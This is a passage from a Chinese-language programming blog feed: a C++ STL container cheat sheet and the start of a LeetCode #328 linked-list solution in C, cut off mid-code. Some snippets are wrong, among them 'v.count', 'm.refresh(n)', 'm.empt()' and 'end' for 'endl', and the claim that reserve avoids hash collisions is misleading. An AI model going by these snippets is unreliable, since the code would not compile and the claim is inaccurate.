class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Traversal</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; v.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">    cout &lt;&lt; v[i] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> it = <span class="built_in">find</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), val); <span class="comment">// 尋找第一個val出現的位置。</span></span><br><span class="line">v.<span class="built_in">count</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), val); <span class="comment">// 計算範圍內val出現的次數</span></span><br></pre></td></tr></table></figure><p>Traversal 還可以寫成下面的形式，但這個就會提到 Iterator，稍後會提到。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); ++it) &#123;</span><br><span class="line">    cout &lt;&lt; *it &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><p>移動或是刪除等操作都是 $O(1)$</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// delcare list container</span></span><br><span class="line">list&lt;<span class="type">int</span>&gt; l;</span><br></pre></td></tr></table></figure><p>常見操作:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">l.<span class="built_in">empty</span>();</span><br><span class="line">l.<span class="built_in">size</span>();</span><br><span class="line">l.<span class="built_in">push_back</span>();</span><br><span class="line">l.<span class="built_in">pop_back</span>();</span><br><span class="line">l.<span class="built_in">push_front</span>();</span><br><span class="line">l.<span class="built_in">pop_front</span>();</span><br></pre></td></tr></table></figure><p>將一個list中的值移到另一個list中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l.<span class="built_in">splice</span>(iterator pos, list&amp; x); <span class="comment">// 把x所有的element接到l中pos的位置。</span></span><br><span class="line">l.<span class="built_in">splice</span> (iterator pos, list&amp; x, iterator i); <span class="comment">// 把i單一個element從x中搬移到l中pos的位置。</span></span><br><span class="line">l.<span class="built_in">splice</span> (iterator pos, list&amp; x, iterator first, iterator last); <span class="comment">// 把x中從first到last的element搬到l中pos的位置。</span></span><br></pre></td></tr></table></figure><h2 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h2><p>特性: LIFO(Last-In-First-Out)，Stack是object的有限序列，並滿足序列中被刪除、檢索和修改的項只能是最近插入序列的obj</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="comment">// declare a stack</span></span><br><span class="line">stack&lt;T&gt; s;</span><br><span class="line"><span class="comment">// 常用function</span></span><br><span class="line">s.<span class="built_in">empty</span>(); <span class="comment">//測試堆疊是否為空。若為空回傳 true，反之 false。</span></span><br><span class="line">s.<span class="built_in">size</span>(); <span class="comment">//回傳目前堆疊中有幾個元素。</span></span><br><span class="line">s.<span class="built_in">push</span>(); <span class="comment">//在堆疊中加入一個元素。</span></span><br><span class="line">s.<span class="built_in">pop</span>(); <span class="comment">//移除目前堆疊中最上層元素</span></span><br><span class="line">s.<span class="built_in">top</span>(); <span class="comment">//取得目前堆疊中最上層元素</span></span><br></pre></td></tr></table></figure><h2 id="Queue"><a href="#Queue" class="headerlink" title="Queue"></a>Queue</h2><p>特性: FIFO(First-In-First-Out)，所以插入只可以在尾部進行，刪除、檢索和修改只允許從頭部進行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="comment">// declare a queue</span></span><br><span class="line">queue&lt;T&gt; q;</span><br><span class="line"><span class="comment">// 常用function</span></span><br><span class="line">q.<span class="built_in">empty</span>(); <span class="comment">//測試佇列是否為空。若為空回傳 true，反之 false。</span></span><br><span class="line">q.<span class="built_in">size</span>(); <span class="comment">//回傳目前佇列中有幾個元素。</span></span><br><span class="line">q.<span class="built_in">push</span>(); <span class="comment">//在佇列中加入一個元素。</span></span><br><span class="line">q.<span class="built_in">pop</span>(); <span class="comment">//移除目前佇列中最前端元素 (即最早進入佇列的元素)。</span></span><br><span class="line">q.<span class="built_in">front</span>(); <span class="comment">//取得目前佇列中最前端元素的 reference</span></span><br></pre></td></tr></table></figure><h2 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><p>其實就是 <strong>heap</strong> 結構，常用於Dijkstra 演算法中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="comment">// declare a priorityqueue</span></span><br><span class="line">priority_queue&lt;T&gt; pq;    <span class="comment">// 預設為最大在上面</span></span><br><span class="line">priority_queue&lt;T, vector&lt;T&gt;, greater&lt;T&gt; &gt; pq;  <span class="comment">//改成由小排到大</span></span><br><span class="line"><span class="comment">// 自己定義compare function</span></span><br><span class="line"><span class="comment">// 從小排到大，與sort的cmp相反</span></span><br><span class="line"><span class="keyword">auto</span> cmp = [](<span class="type">int</span>&amp; a, <span class="type">int</span>&amp; b) &#123;</span><br><span class="line">        <span class="keyword">return</span> a &gt; b;</span><br><span class="line">&#125;;</span><br><span class="line">priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, <span class="keyword">decltype</span>(cmp)&gt; <span class="built_in">pq</span>(cmp);</span><br><span class="line"><span class="comment">// 常用function</span></span><br><span class="line">pq.<span class="built_in">empty</span>(); <span class="comment">//測試優先佇列是否為空。若為空回傳 true，反之 false。</span></span><br><span class="line">pq.<span class="built_in">size</span>(); <span class="comment">//回傳目前優先佇列中有幾個元素。</span></span><br><span class="line">pq.<span class="built_in">push</span>(); <span class="comment">//在優先佇列中加入一個元素。</span></span><br><span class="line">pq.<span class="built_in">pop</span>(); <span class="comment">//移除目前優先佇列中優先順序最高的元素。</span></span><br><span class="line">pq.<span class="built_in">top</span>(); <span class="comment">//取得目前優先佇列中優先順序最高元素的 constant reference。</span></span><br></pre></td></tr></table></figure><p>要注意的是，PQ 的 <code>pop</code> 跟 <code>push</code> 複雜度會是 $O(Log n)$</p><h3 id="make-heap-操作"><a href="#make-heap-操作" class="headerlink" title="make heap 操作"></a>make heap 操作</h3><p>有個省空間的方法，就是透過 <code>make_heap</code> 來讓 vector 變成 heap，這樣空間複雜度會變成 $O(1)$</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; nums&#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>&#125;;</span><br><span class="line"><span class="built_in">make_heap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>()); <span class="comment">// 預設是max-heap</span></span><br><span class="line"><span class="built_in">make_heap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="built_in">less</span>&lt;<span class="type">int</span>&gt;()); <span class="comment">// max-heap</span></span><br><span class="line"><span class="built_in">make_heap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;()); <span class="comment">// min-heap</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pop，因為pop_heap只是把element往最後移動，</span></span><br><span class="line"><span class="comment">// 所以還要pop_back()</span></span><br><span class="line"><span class="built_in">pop_heap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>()); <span class="comment">// for max-heap</span></span><br><span class="line"><span class="built_in">pop_heap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;()); <span class="comment">// for min-heap</span></span><br><span class="line">nums.<span class="built_in">pop_back</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// push, 需要先把element放到最後</span></span><br><span class="line">nums.<span class="built_in">push_back</span>(val);</span><br><span class="line"><span class="built_in">push_heap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>()); <span class="comment">// for max-heap</span></span><br><span class="line"><span class="built_in">push_heap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;()); <span class="comment">// for min-heap</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// sort_heap</span></span><br><span class="line"><span class="built_in">sort_heap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>()); <span class="comment">// 升序排序</span></span><br><span class="line"><span class="built_in">sort_heap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;()); <span class="comment">// 降序排序</span></span><br></pre></td></tr></table></figure><h2 id="Set-和-MultiSet"><a href="#Set-和-MultiSet" class="headerlink" title="Set 和 MultiSet"></a>Set 和 MultiSet</h2><p>Set 就是集合<br><img src="/img/LeetCode/C++_STL/set.png"></p><p>預設set會從小到大排序，set容器裡面的元素是唯一的，具有不重複的特性<br>而 multiset可以允許元素重複。unordered_set 不排序的set。unordered_multiset 不排序的multiset。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="comment">// declare a set</span></span><br><span class="line">set&lt;T&gt; s;</span><br><span class="line">set&lt;T&gt; s&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;; <span class="comment">// with initial value</span></span><br><span class="line"><span class="function">set&lt;T&gt; <span class="title">s</span><span class="params">(vector&lt;T&gt;)</span></span>;    <span class="comment">// 可以輸入vector</span></span><br><span class="line"><span class="function">set&lt;T&gt; <span class="title">s</span><span class="params">(vector.begin(), vector.end())</span></span>; <span class="comment">// import data from vector，方便查找資料</span></span><br><span class="line">set&lt;T,greater&lt;T&gt;&gt; s2; <span class="comment">// 從大排到小</span></span><br><span class="line">multiset&lt;T&gt; st;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常用function</span></span><br><span class="line">s.<span class="built_in">empty</span>();</span><br><span class="line">s.<span class="built_in">size</span>();</span><br><span class="line">s.<span class="built_in">insert</span>();</span><br><span class="line"><span class="keyword">auto</span> it = s.<span class="built_in">insert</span>(val); <span class="comment">// 可以取得insert之後的位置</span></span><br><span class="line">s.<span class="built_in">erase</span>();    <span class="comment">// 可以傳入key或是iterator, 如果傳入為key會刪除重複的key</span></span><br><span class="line"><span class="comment">//所以必須先使用find找出value的iterator，這樣才可以確保只刪除一個</span></span><br><span class="line">s.<span class="built_in">erase</span>(s.<span class="built_in">find</span>(value));</span><br><span class="line">s.<span class="built_in">clear</span>();</span><br><span class="line">s.<span class="built_in">count</span>(); <span class="comment">// 看看elemet有幾個，因為set只容許一個，所以等於是判斷有無。multiset會回傳個數。</span></span><br><span class="line">s.<span class="built_in">find</span>(); <span class="comment">// 回傳iterator，所以還要判斷使否是s.end();</span></span><br><span class="line"><span class="comment">// convert set to vector</span></span><br><span class="line"><span class="function">vector&lt;T&gt; <span class="title">v</span><span class="params">(s.begin(), s.end())</span></span>;</span><br><span class="line"><span class="comment">// Traversal</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">const</span> <span class="keyword">auto</span>&amp; item : s) &#123;    <span class="comment">//宣告成const前提是不會在function內修改item的值。</span></span><br><span class="line">    cout &lt;&lt; item &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> it = s.<span class="built_in">begin</span>(); it != s.<span class="built_in">end</span>(); ++it)&#123;</span><br><span class="line">    cout &lt;&lt; *it &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it = s.<span class="built_in">rbegin</span>(); it != s.<span class="built_in">rend</span>(); ++it) &#123;</span><br><span class="line">    cout &lt;&lt; *it &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 取第一個和最後一個element</span></span><br><span class="line">cout &lt;&lt; *s.<span class="built_in">begin</span>() &lt;&lt; endl;    <span class="comment">// 取第一個element的值</span></span><br><span class="line">cout &lt;&lt; *s.<span class="built_in">rbegin</span>() &lt;&lt; endl;   <span class="comment">// 取最後一個element的值，不可以直接使用end()</span></span><br><span class="line">cout &lt;&lt; *(--s.<span class="built_in">end</span>()) &lt;&lt; end;   <span class="comment">// 必須使用end()的前一個</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Map-和-MulitMap"><a href="#Map-和-MulitMap" class="headerlink" title="Map 和 MulitMap"></a>Map 和 MulitMap</h2><p>Map 就像是一個對應表，使用key-value pair 來去實現一對一的映射關係<br><img src="/img/LeetCode/C++_STL/map.png"></p><ul><li>預設也是從小到大排序</li><li>multimap 允許多個相同的key-value pair。</li><li>unordered_map 不排序的map。</li><li>unordered_multimap 不排序的multimap。</li></ul><p>簡單範例:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    map&lt;string, <span class="type">int</span>&gt; m;     <span class="comment">// 從 string 對應到 int</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 設定對應的值</span></span><br><span class="line">    m[<span class="string">&quot;one&quot;</span>] = <span class="number">1</span>;       <span class="comment">// &quot;one&quot; -&gt; 1</span></span><br><span class="line">    m[<span class="string">&quot;two&quot;</span>] = <span class="number">2</span>;       <span class="comment">// &quot;two&quot; -&gt; 2</span></span><br><span class="line">    m[<span class="string">&quot;three&quot;</span>] = <span class="number">3</span>;     <span class="comment">// &quot;three&quot; -&gt; 3</span></span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; m.<span class="built_in">count</span>(<span class="string">&quot;two&quot;</span>) &lt;&lt; endl;     <span class="comment">// 1 -&gt; 有對應</span></span><br><span class="line">    cout &lt;&lt; m.<span class="built_in">count</span>(<span class="string">&quot;ten&quot;</span>) &lt;&lt; endl;     <span class="comment">// 0 -&gt; 沒有對應</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="comment">//declare a map</span></span><br><span class="line">map&lt;T, U&gt; m;</span><br><span class="line">map&lt;T, U, greater&lt;T&gt;&gt; m; <span class="comment">// 從大排到小</span></span><br><span class="line"><span class="comment">// 常用function</span></span><br><span class="line">m.<span class="built_in">empt</span>();</span><br><span class="line">m.<span class="built_in">size</span>();</span><br><span class="line">m.<span class="built_in">insert</span>();</span><br><span class="line">m.<span class="built_in">erase</span>();  <span class="comment">// 刪除element</span></span><br><span class="line">m.<span class="built_in">clear</span>();  <span class="comment">// 清空所有的element</span></span><br><span class="line">m.<span class="built_in">count</span>();  <span class="comment">// 回傳有幾個element</span></span><br><span class="line">m.<span class="built_in">find</span>();   <span class="comment">// 回傳iterator</span></span><br><span class="line">m.<span class="built_in">swap</span>(x);  <span class="comment">// 把m和x的資料交換，m和x必須一樣的type</span></span><br><span class="line"><span class="comment">// Traversal by reference</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; item : m) &#123;</span><br><span class="line">    cout &lt;&lt; item.first &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; item.second &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Traversal by reference with name</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">const</span> <span class="keyword">auto</span>&amp; [key, value] : m) &#123;</span><br><span class="line">    cout &lt;&lt; key &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; value &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Traversal by iterator</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it = m.<span class="built_in">begin</span>(); it != m.<span class="built_in">end</span>(); ++it) &#123;</span><br><span class="line">    cout &lt;&lt; it-&gt;first &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; it-&gt;second &lt;&lt; endl;</span><br><span class="line">    <span class="comment">// 使用prev()取得iterator的前一個</span></span><br><span class="line">    cout &lt;&lt; <span class="built_in">prev</span>(it)-&gt;first &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; <span class="built_in">prev</span>(it)-&gt;second &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 取第一個和最後一個element</span></span><br><span class="line">cout &lt;&lt; m.<span class="built_in">begin</span>()-&gt;first &lt;&lt; endl;    <span class="comment">// 取第一個element的值</span></span><br><span class="line">cout &lt;&lt; m.<span class="built_in">rbegin</span>()-&gt;first &lt;&lt; endl;   <span class="comment">// 取最後一個element的值，不可以直接使用end()</span></span><br><span class="line">cout &lt;&lt; (--m.<span class="built_in">end</span>())-&gt;first &lt;&lt; end;   <span class="comment">// 必須使用end()的前一個</span></span><br></pre></td></tr></table></figure><blockquote><p>map 的底層實現是用紅黑樹，因此它的對應都是按照key去做排序的，因此插入，查找，刪除等操作的複雜度都是 $O(Log n)$<br>unordered_map 的底層實現則是用hash table，是無序的，因此複雜度會是 $O(1)$</p></blockquote><p>使用unordered_map的時候，根據key產生出來的hash來查找value。既然是hash就會有碰撞問題</p><blockquote><p>As we know a Bucket is a slot in the container’s internal hash table to which all the element are assigned based on the hash value of their key . Buckets are numbered from 0 to bucket_count.</p></blockquote><p>如果增加的數目超出bucket_count，map就會自動變大bucket_slot，並且重新計算所有item的hash。</p><blockquote><p>When the Load Factor(load_factor) reaches a certain threshold, the container increases the number of buckets and rehashes the map.</p></blockquote><p>使用以下的程式碼，就是放大bucket到n，並且重新計算hash table。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m.<span class="built_in">refresh</span>(n);</span><br></pre></td></tr></table></figure><p>如果我們事先知道大小可以使用以下function直接保留bucket到n，避免超出threshold需要放大container。因為事先保留了n個bucket也可以避免hash collision。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m.<span class="built_in">reserve</span>(n);</span><br></pre></td></tr></table></figure><h1 id="參考"><a href="#參考" class="headerlink" title="參考"></a>參考</h1><p>[1] <a href="https://hackmd.io/@sa072686/cp/%2F%40sa072686%2FS11uDpiuH">https://hackmd.io/@sa072686/cp/%2F%40sa072686%2FS11uDpiuH</a><br>[2] <a href="https://jasonblog.github.io/note/c++/stl_rong_qi_4e0029_-_ji_ben_jie_shao.html">https://jasonblog.github.io/note/c++/stl_rong_qi_4e0029_-_ji_ben_jie_shao.html</a><br>[3] <a href="https://hackmd.io/@meyr543/BkgMaiV6Y#Vector">https://hackmd.io/@meyr543/BkgMaiV6Y#Vector</a><br>[4] <a href="https://blog.csdn.net/weixin_42292229/article/details/125523668">https://blog.csdn.net/weixin_42292229/article/details/125523668</a><br>[5] <a href="https://ikaminyou.medium.com/leetcode-%E5%88%B71500%E9%A1%8C%E5%BF%83%E8%B7%AF%E6%AD%B7%E7%A8%8B-8614284f03da">https://ikaminyou.medium.com/leetcode-%E5%88%B71500%E9%A1%8C%E5%BF%83%E8%B7%AF%E6%AD%B7%E7%A8%8B-8614284f03da</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> STL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>奇偶數鏈節串列 | Medium | LeetCode#328 Odd Even Linked List</title>
      <link href="/posts/Odd_Even_Linked_List.html"/>
      <url>/posts/Odd_Even_Linked_List.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/328/question1.png"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 給定一個 single linked list 的 <code>head</code>，將所有具有奇數索引的節點分組在一起，然後將具有偶數索引的節點分組，並傳回重新排序的list。第一個節點為奇數索引，接著第二個為偶數，以此類推，此題要求實作的演算法空間複雜度為 $O(1)$ 而時間複雜度為 $O(n)$</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p><img src="/img/LeetCode/328/algo1.png"></p><blockquote><p>我的想法就是先traverse list，然後紀錄偶數節點個數和奇數節點個數，之後各自建立新的lists，最後合併兩個lists然後回傳薪的head</p></blockquote><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">oddEvenList</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> oddCounter = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> evenCounter = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">ptr</span> =</span> head;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// traverse through the list, derive the length of the list</span></span><br><span class="line">    <span class="keyword">while</span>(ptr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        counter++;</span><br><span class="line">        <span class="keyword">if</span> (counter % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            evenCounter++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            oddCounter++;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = ptr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create odd list</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">oddPtr</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">newOddHead</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">OddTail</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">oddPrevious</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; oddCounter; i++) &#123;</span><br><span class="line">        <span class="class"><span 